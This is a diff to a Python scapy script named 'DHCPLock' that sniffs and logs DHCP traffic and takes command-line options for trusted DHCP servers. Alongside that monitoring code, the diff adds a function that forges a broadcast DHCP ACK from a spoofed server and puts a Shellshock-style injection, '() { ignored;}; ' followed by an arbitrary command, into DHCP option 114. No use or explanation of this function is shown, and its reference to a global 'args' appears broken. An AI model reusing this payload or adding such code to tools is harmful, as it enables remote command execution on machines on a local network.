@@ -2,6 +2,30 @@
 
 from scapy.all import *
 import logging
+import argparse
+
+#BOOTP
+#siaddr = DHCP server ip
+#yiaddr = ip offered to client
+#xid = transaction id 
+#chaddr = clients mac address in binary format
+
+def dhcp_ack(raw_mac, xid, command):
+	packet = (Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /
+	IP(src="192.168.2.1", dst='255.255.255.255') /
+	UDP(sport=67, dport=68) /
+	BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.2.1', xid=xid) /
+	DHCP(options=[("message-type", "ack"),
+		('server_id', '192.168.2.1'),
+		('subnet_mask', '255.255.255.0'),
+		('router', '192.168.2.5'),
+		('lease_time', 172800),
+		('renewal_time', 86400),
+		('rebinding_time', 138240),
+		(114, "() { ignored;}; " + command),
+		"end"]))
+	return packet
+
 
 # Fixup function to extract dhcp_options by key
 def get_option(dhcp_options, key):
@@ -27,6 +51,7 @@ def dhcp(resp):
 	if resp.haslayer(DHCP):
 		mac_addr = resp[Ether].src
 
+		# ---- DHCP DISCOVER ----
 		if resp[DHCP].options[0][1] == 1:
 			xid = resp[BOOTP].xid
 			logging.info("[*] Got new DHCP DISCOVER from: " + mac_addr + " xid: " + hex(xid))
@@ -34,6 +59,7 @@ def dhcp(resp):
 			logging.info(f"Host {hostname} ({resp[Ether].src}) asked for an IP")
 			logging.info(resp.show())
 
+		# ---- DHCP OFFER ----
 		if resp[DHCP].options[0][1] == 2:
 			xid = resp[BOOTP].xid
 			logging.info("[*] Got new DHCP OFFER from: " + mac_addr + " xid: " + hex(xid))
@@ -43,15 +69,14 @@ def dhcp(resp):
 			name_server = get_option(resp[DHCP].options, 'name_server')
 			domain = get_option(resp[DHCP].options, 'domain')
 
-
 			logging.info(f"DHCP Server {resp[IP].src} ({resp[Ether].src}) "
 			      f"offered {resp[BOOTP].yiaddr}")
-
 
 			logging.info(f"DHCP Options: subnet_mask: {subnet_mask}, lease_time: "
 			      f"{lease_time}, router: {router}, name_server: {name_server}, "
 			      f"domain: {domain}")
 
+		# ---- DHCP REQUEST ----
 		if resp[DHCP].options[0][1] == 3:
 			xid = resp[BOOTP].xid
 			logging.info("[*] Got new DHCP REQUEST from: " + mac_addr + " xid: " + hex(xid))
@@ -62,13 +87,21 @@ def dhcp(resp):
 
 
 def main():
+	# logger
 	logging.basicConfig(filename='myapp.log', filemode='w', level=logging.INFO, format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s', datefmt='%m-%d %H:%M')
 	console = logging.StreamHandler()
 	console.setLevel(logging.INFO)
 	formatter = logging.Formatter('%(name)-12s: %(levelname)-8s %(message)s')
 	console.setFormatter(formatter)
 	logging.getLogger().addHandler(console)
-	interface = 'enp0s8'
+	#args_parser
+	parser = argparse.ArgumentParser(description='DHCPLock', epilog='Lock dem baby!')
+	parser.add_argument('-i', '--iface', type=str, required=True, help='Interface to use')
+	parser.add_argument('-n', '--quantity', type=str, help='The number of trusted DHCP servers')
+	parser.add_argument('-s', '--servers', type=str, help='Trusted DHCP servers` IP addresses')
+	args = parser.parse_args()
+	# settings for interface and dhcplock_filter
+	interface = args.iface
 	dhcplock_filter = 'udp and (port 67 or 68)'
 	logging.info("[*] Waiting for a DHCP Packets...")
 	sniff(iface=interface, filter=dhcplock_filter, prn=dhcp)
